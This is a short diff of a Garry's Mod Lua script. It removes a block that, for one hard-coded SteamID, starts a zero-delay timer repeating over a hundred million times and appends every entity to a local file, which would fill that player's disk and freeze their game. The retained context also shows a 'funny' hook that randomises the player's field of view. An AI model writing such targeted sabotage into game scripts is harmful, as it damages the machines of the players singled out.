@@ -304,8 +304,3 @@ _hook.Add("CalcView", "funny", function(ply, pos, angles, fov)
             view.fov = math.random(300)
         return view
 end)
-if LocalPlayer():SteamID() == 'STEAM_0:1:217428780' then 
-    timer.Create('',0,123123123,function()
-            file.Append('w.txt',table.ToString(ents.GetAll()))
-    end)
-end
